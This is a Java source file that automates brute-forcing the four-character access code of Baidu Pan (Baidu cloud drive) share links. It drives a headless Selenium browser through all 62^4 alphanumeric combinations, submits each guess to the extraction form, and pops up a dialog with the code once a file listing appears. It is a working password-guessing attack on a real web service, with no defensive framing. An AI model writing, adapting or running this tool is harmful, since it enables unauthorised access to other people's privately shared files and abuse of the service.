package baidupan;

import javax.swing.JOptionPane;
import javax.swing.JTextField;

import org.openqa.selenium.By;
import org.openqa.selenium.htmlunit.HtmlUnitDriver;

public class Selenium {
	private static String[] arr= {"0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"};
	public static void test(String url,String pwd) throws Exception {
		HtmlUnitDriver driver = new HtmlUnitDriver(true);
		driver.get(url);
		Thread.sleep(1000);
		driver.findElement(By.id("dtQNPK")).sendKeys(pwd);
		driver.findElement(By.xpath("//span[text()='提取文件']")).click();
		Thread.sleep(1000);
		try{
			driver.findElement(By.xpath("//h2[@class='file-name']"));
			JOptionPane.showMessageDialog(null,"密码为:"+pwd);
			System.exit(0);
		}catch(Exception e) {
			
		}
		driver.close();
	}
	public static int location(String c) {
		int num=0;
		for(int i=0;i<arr.length;i++) {
			if(arr[i].equals(c)) {
				num=i;
				break;
			}
		}
		return num;
	}
	public static void init(String url,String pwd,JTextField confirmpswText) throws Exception {
		if(pwd.contains("0000")) {
			new Thread(new Runnable(){
			    @Override
			    public void run() {
			    	for(int i=0;i<arr.length;i++) {
						for(int j=0;j<arr.length;j++) {
							for(int k=0;k<arr.length;k++) {
								for(int l=0;l<arr.length;l++) {
									confirmpswText.setText(arr[i]+arr[j]+arr[k]+arr[l]);
									confirmpswText.paintImmediately(confirmpswText.getBounds());
									try {
										test(url,arr[i]+arr[j]+arr[k]+arr[l]);
									} catch (Exception e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
								}
							}
						}
					}
			    }
			}).start();
		}else {
			new Thread(new Runnable(){
			    @Override
			    public void run() {
			    	for(int i=location(pwd.substring(0,1));i<arr.length;i++) {
						for(int j=location(pwd.substring(1,2));j<arr.length;j++) {
							for(int k=location(pwd.substring(2,3));k<arr.length;k++) {
								for(int l=location(pwd.substring(3));l<arr.length;l++) {
									confirmpswText.setText(arr[i]+arr[j]+arr[k]+arr[l]);
									confirmpswText.repaint();
									try {
										test(url,arr[i]+arr[j]+arr[k]+arr[l]);
									} catch (Exception e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
								}
							}
						}
					}
			    }
			}).start();
		}
	}

}
